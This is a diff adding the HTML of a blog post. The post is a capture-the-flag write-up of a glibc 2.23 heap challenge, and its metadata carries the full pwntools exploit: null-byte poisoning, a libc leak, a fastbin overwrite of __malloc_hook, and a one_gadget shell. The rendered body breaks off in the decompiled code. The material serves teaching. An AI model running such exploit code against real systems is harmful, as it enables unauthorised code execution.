@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu baby heap Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, heap">
+<meta name="description" content="Challenge overview
+In this challenge you can test your understanding about basic heap exploitation.
+Just as a side note, I&rsquo;ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we&rsquo;re solving this! So this is a great and notable milestone.
+
+I wrote that ^ in February and it&rsquo;s May 11th now.
+
+
+As the challenge suggests, this is a heap overflow.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/babyheap-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/babyheap-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/babyheap-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu baby heap Writeup">
+  <meta property="og:description" content="Challenge overview In this challenge you can test your understanding about basic heap exploitation.
+Just as a side note, I’ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we’re solving this! So this is a great and notable milestone.
+I wrote that ^ in February and it’s May 11th now.
+As the challenge suggests, this is a heap overflow.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-11T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu baby heap Writeup">
+<meta name="twitter:description" content="Challenge overview
+In this challenge you can test your understanding about basic heap exploitation.
+Just as a side note, I&rsquo;ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we&rsquo;re solving this! So this is a great and notable milestone.
+
+I wrote that ^ in February and it&rsquo;s May 11th now.
+
+
+As the challenge suggests, this is a heap overflow.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu baby heap Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/babyheap-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu baby heap Writeup",
+  "name": "CyberEdu baby heap Writeup",
+  "description": "Challenge overview In this challenge you can test your understanding about basic heap exploitation.\nJust as a side note, I\u0026rsquo;ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we\u0026rsquo;re solving this! So this is a great and notable milestone.\nI wrote that ^ in February and it\u0026rsquo;s May 11th now.\nAs the challenge suggests, this is a heap overflow.\n",
+  "keywords": [
+    "CyberEdu", "pwn", "heap"
+  ],
+  "articleBody": "Challenge overview In this challenge you can test your understanding about basic heap exploitation.\nJust as a side note, I’ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we’re solving this! So this is a great and notable milestone.\nI wrote that ^ in February and it’s May 11th now.\nAs the challenge suggests, this is a heap overflow.\nWe have three options: free, malloc and show.\nunsigned __int64 do_free() { unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"Id: \"); _isoc99_scanf(\"%u\", \u0026v1); if ( v1 \u003c= 5 ) { if ( *((_QWORD *)\u0026unk_202040 + v1) ) { free(*((void **)\u0026unk_202040 + v1)); *((_QWORD *)\u0026unk_202040 + v1) = 0; puts(\"Successfully removed.\\n\"); } else { puts(\"Id is not available.\\n\"); } } else { puts(\"Invalid id.\\n\"); } return __readfsqword(0x28u) ^ v2; } unsigned __int64 do_malloc() { unsigned int nbytes; // [rsp+4h] [rbp-21Ch] BYREF unsigned int nbytes_4; // [rsp+8h] [rbp-218h] unsigned int v3; // [rsp+Ch] [rbp-214h] char buf[520]; // [rsp+10h] [rbp-210h] BYREF unsigned __int64 v5; // [rsp+218h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = 5; for ( nbytes_4 = 0; nbytes_4 \u003c= 4; ++nbytes_4 ) { if ( !*((_QWORD *)\u0026unk_202040 + nbytes_4) ) { v3 = nbytes_4; break; } } if ( v3 == 5 ) { puts(\"No free space available. Try removing some data.\\n\"); } else { printf(\"Size: \"); _isoc99_scanf(\"%u\", \u0026nbytes); if ( nbytes \u003c= 0x1FF ) { printf(\"Input: \"); nbytes = read(0, buf, nbytes); buf[nbytes] = 0; *((_QWORD *)\u0026unk_202040 + v3) = malloc(nbytes); strcpy(*((char **)\u0026unk_202040 + v3), buf); puts(\"Data was saved.\\n\"); } else { puts(\"The maximum size was exceeded.\\n\"); } } return __readfsqword(0x28u) ^ v5; } Identifying the vulnerabilities The ids of the chunks are stored at \u0026unk_202040.\nHere, we have a 1 byte overflow of our data; Except it’s a null byte.\nSo by doing malloc(a), malloc(b), free(a) and malloc(a) again, except overflow this time, we can modify the size of chunk b’s first byte.\nI found this resource, saying:\nThe overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the prev_in_use bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing.\nIn addition, when the prev_size field is enabled, you can forge prev_size, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked.\nInteresting, so that’s what we’re dealing with. I looked and found another great resource, which solved what could be our exact challenge except with different names for the functions. I definitely recommend reading it; there’s a lot of in-depth information about everything that’s happening.\nThe leak What we need is a libc leak, and a hook overwrite.\nBut let’s take things step by step.\nAll we can do now, is make it so the next address’ prev_inuse flag will be null. That way, when we free it, we can have it trigger a consolidation with one of the previous chunks.\nIn order to do that, there’s a couple of things we need to take into consideration.\nA chunk’s structure looks like this:\nstruct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; So in order to consolidate a chunk with a previous one, we must also fake a prev_size, and have the previous chunk present valid fd/bk pointers.\nWe can absolutely get around this - we can create a REAL freed chunk (A), for the valid fd/bk, before a buffer chunk (B).\nThen, we’re going to tell the null byte poisoned chunk (C) to treat the real freed chunk (A) and the buffer chunk (B) as one continuous chunk, by specifying the prev_size of both of them combined.\nSo when we free the poisoned chunk (C), it will attempt to create one huge chunk, all the way from the from A to C. To prevent it from consolidating with the wilderness, we will also add another smaller fastbin-size chunk after chunk C, which I’ll call D.\nBut the thing is, chunk B hasn’t been freed yet; So we can still print the information from there.\nBut right now, it shouldn’t have any fd or bk pointers inside. Those are in the beginning of the huge continuous chunk.\nTo do that, we can malloc, and that will eat from continuous chunk’s size; that will leave in the remaining free chunk the fd and bk. If we get the right size in the malloc, the free chunk pointers will overlap chunk B’s data perfectly.\nAnd now, since we overwrote chunk B’s metadata, we’re going to have to restore it (the size field) in order to fit it into fastbins, so back to 0x70. More on why in the second part.\nIf I lost you, there are visual representations of this in the link I added above, so check it out.\nThis is the first part of the exploit; so let’s get started.\nFirst, I created all the chunks, freed A, and overwrote chunk C’s prev_inuse:\n#chunk A malloc(b\"248\", b\"A\"*247) #chunk B malloc(b\"104\", b\"B\"*103) #chunk C malloc(b\"248\", b\"C\"*247) #chunk D malloc(b\"24\", b\"D\"*23) #free chunk A free(b\"0\") #turn chunk C's prev_inuse to 0 free(b\"1\") malloc(b\"104\", b\"C\"*104) #after doing this, the index of chunk B will be 0 Now, we need to create a fake prev_size. The data is moved through strcpy, which breaks on null bytes, though. So we’re going to have to use the fact that the last byte of data of each malloc at position B will be turned into a null byte.\nSo we keep malloc-ing and freeing smaller and smaller chunks, until we reach our desired offset.\nAnd keep in mind, now the index of chunk B will be 0, since we freed A, then B, then malloc-ed again; The slot in 0 is open again, and that’s where B is going to be put.\n#create fake prev_size for chunk C #first the null bytes for i in range(1, 7): free(b\"0\") malloc(b\"104\", b\"B\"*(104-i)) Since the desired prev_size is of A’s size + B’s size, that’s going to be 0x170.\nfree(b\"0\") malloc(b\"104\", b\"B\"*(104-8)+b\"\\x70\\x01\") I realised that the libc version I was using for this was way too recent and invulnerable to this sort of stuff, so I switched to an older version for the sake of this challenge. (something in glibc 2.23).\nNow, let’s trigger the consolidation, by freeing chunk C.\nNice! All went well! Next step, we malloc something to push the fd and bk into B’s data.\n#trigger consolidation of chunk C with previous chunk! free(b\"2\") malloc(b\"248\", b\"A\"*247) The offset locally for me was 0x3c4b78, hopefully we guessed the libc version correctly and we don’t have to change this.\nThe overwrite Now, the hard part is over. What we want to do now is overwrite a hook, like __malloc_hook with a one_gadget/system.\nWe can abuse the fastbins for this; If we send free chunk B of size 0x70, it will end up in the fastbin, and it will receive a fd address. When we free chunk B, the next head of the fastbins will be what’s stored in fd.\nIf we overwrite fd, we control the address of the next element of the fastbin.\nThen, the next time we malloc something of a simliar size, it will attempt to place it in the current head of the fastbin. Which is our controlled address.\nThe reason I’m referring to it as a controlled address is because we control the chunk before it, chunk A (or what’s become of it). That way, we can finally pop a shell.\n#now, let's restore the size of chunk B so it fits back into fastbins #the chunk A is now stored at index 1 free(b\"1\") malloc(b\"250\", b\"E\"*250) free(b\"1\") malloc(b\"250\", b\"E\"*248+b\"\\x70\") Now, we free both chunk B and chunk E (that’s what I’m going to call chunk A now), and overwrite the fd of B with the first valid chunk metadata before __malloc_hook:\nfree(b\"0\") free(b\"1\") #malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook. malloc_hook_offset = 0x3c4b10 fake_hook_chunk = libc + malloc_hook_offset - 0x23 malloc(b\"264\", b\"A\"*256 + p64(fake_hook_chunk)) Now, let’s restore the integrity of poor chunk B again. We’re freeing E and malloc-ing it again to restore the size and flags of chunk B.\n#restore chunk B's metadata through chunk E for i in range(1, 7): free(b\"0\") malloc(b\"256\", b\"E\"*(256-i)) free(b\"0\") malloc(b\"250\", b\"E\"*248+b\"\\x70\") Let’s do the two mallocs as well, and see what happens:\n#chunk B malloc(b\"104\", b\"B\"*103) #malloc_hook malloc(b\"104\", b\"B\"*103) Great - now we just need to overwrite it with a proper one_gadget!\nAnd you won’t believe what happened now. Maybe you remember I said I downloaded some random glibc 2.23 for testing. Well, I tried to get its one_gadgets, and none worked. So I scrolled through the source, to see what gadgets they used. I thought to myself, I surely downloaded the wrong libc, because there’s no other way to solve this.\nAnd, the third gadget from their list worked!! I tested them remotely right away, so I got the flag! I was very surprised to see it.\nAnyways, I rewrote the last part like so:\none_gadget = libc + 0xf02a4 #malloc_hook malloc(b\"104\", b\"B\"*(19) + p64(one_gadget) + b\"\\x00\"*65) #gdb.attach(p, gdbscript = ''' #b * \u0026__malloc_hook #c #''') #one last malloc malloc(b\"24\", b\"F\"*23) The full exploit from pwn import * elf = ELF('./pwn') context.arch = 'amd64' cyberedu = '34.159.85.111:31989' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() def malloc(size, data): #select p.recvuntil(b\": \") p.sendline(b\"1\") #size p.recvuntil(b\": \") p.sendline(size) #data p.recvuntil(b\": \") p.send(data) def free(data_id): #select p.recvuntil(b\": \") p.sendline(b\"2\") #select ID p.recvuntil(b\": \") p.sendline(data_id) def show(data_id): #select p.recvuntil(b\": \") p.sendline(b\"3\") #select ID p.recvuntil(b\": \") p.sendline(data_id) #when it loops , it only checks if the 8 bytes at that address are null... #0x100-8 turns to 0x101 chunk; 248 #0x68 turns to 0x71 chunk; 104 #0x18 turns to 0x21 chunk; 24 #chunk A malloc(b\"248\", b\"A\"*246) #chunk B malloc(b\"104\", b\"B\"*103) #chunk C malloc(b\"248\", b\"C\"*247) #chunk D malloc(b\"24\", b\"D\"*23) #free chunk A free(b\"0\") #turn chunk C's prev_inuse to 0 free(b\"1\") malloc(b\"104\", b\"B\"*104) #after doing this, the index of chunk B will be 0 #create fake prev_size for chunk C #first the null bytes for i in range(1, 7): free(b\"0\") malloc(b\"104\", b\"B\"*(104-i)) free(b\"0\") malloc(b\"104\", b\"B\"*(104-8)+b\"\\x70\\x01\") #trigger consolidation of chunk C with previous chunk! free(b\"2\") malloc(b\"248\", b\"A\"*247) show(b\"0\") p.recvuntil(b\": \") data = p.recvline().strip() val = u64(data.ljust(8, b\"\\x00\")) print(f\"leaked fd is {hex(val)}\") leak_offset = 0x3c4b78 libc = val - leak_offset print(f\"leaked libc is {hex(libc)}\") #hope this is the same remotely , lol #now, let's restore the size of chunk B so it fits back into fastbins #the chunk A is now stored at index 1 free(b\"1\") malloc(b\"250\", b\"E\"*250) free(b\"1\") malloc(b\"250\", b\"E\"*248+b\"\\x70\") #free chunk B, then free chunk A/E. free(b\"0\") free(b\"1\") #malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook. malloc_hook_offset = 0x3c4b10 fake_hook_chunk = libc + malloc_hook_offset - 0x23 malloc(b\"264\", b\"A\"*256 + p64(fake_hook_chunk)) #restore chunk B's metadata through chunk E for i in range(1, 7): free(b\"0\") malloc(b\"256\", b\"E\"*(256-i)) free(b\"0\") malloc(b\"250\", b\"E\"*248+b\"\\x70\") #chunk B malloc(b\"104\", b\"B\"*103) one_gadget = libc + 0xf02a4 #malloc_hook malloc(b\"104\", b\"B\"*(19) + p64(one_gadget) + b\"\\x00\"*65) #gdb.attach(p, gdbscript = ''' #b * \u0026__malloc_hook #c #''') #one last malloc malloc(b\"24\", b\"F\"*23) p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "1978",
+  "inLanguage": "en",
+  "datePublished": "2026-05-11T00:00:00Z",
+  "dateModified": "2026-05-11T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/babyheap-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu baby heap Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-11 00:00:00 +0000 UTC'>May 11, 2026</span>&nbsp;·&nbsp;<span>10 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a><ul>
+                        
+                <li>
+                    <a href="#the-leak" aria-label="The leak">The leak</a></li>
+                <li>
+                    <a href="#the-overwrite" aria-label="The overwrite">The overwrite</a></li></ul>
+                </li>
+                <li>
+                    <a href="#the-full-exploit" aria-label="The full exploit">The full exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>In <strong><a href="https://app.cyber-edu.co/challenges/559febf0-7f21-11ea-be53-e5754acd68a0?tenant=cyberedu">this challenge</a></strong> you can test your understanding about basic heap exploitation.</p>
+<p>Just as a side note, I&rsquo;ve put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we&rsquo;re solving this! So this is a great and notable milestone.</p>
+<hr>
+<p>I wrote that ^ in February and it&rsquo;s May 11th now.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/lol.gif#center"></p>
+<hr>
+<p>As the challenge suggests, this is a heap overflow.</p>
+<p>We have three options: free, malloc and show.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">do_free</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+4h] [rbp-Ch] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Id: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_isoc99_scanf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> v1) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> v1));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> v1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Successfully removed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Id is not available.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid id.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>) <span style="color:#f92672">^</span> v2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">do_malloc</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> nbytes; <span style="color:#75715e">// [rsp+4h] [rbp-21Ch] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> nbytes_4; <span style="color:#75715e">// [rsp+8h] [rbp-218h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+Ch] [rbp-214h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">520</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-210h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+218h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( nbytes_4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; nbytes_4 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>nbytes_4 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> nbytes_4) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> nbytes_4;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;No free space available. Try removing some data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_isoc99_scanf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, <span style="color:#f92672">&amp;</span>nbytes);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( nbytes <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1FF</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input: &#34;</span>);
+</span></span><span style="display:flex;"><span>      nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, nbytes);
+</span></span><span style="display:flex;"><span>      buf[nbytes] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> v3) <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(nbytes);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>unk_202040 <span style="color:#f92672">+</span> v3), buf);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Data was saved.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;The maximum size was exceeded.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
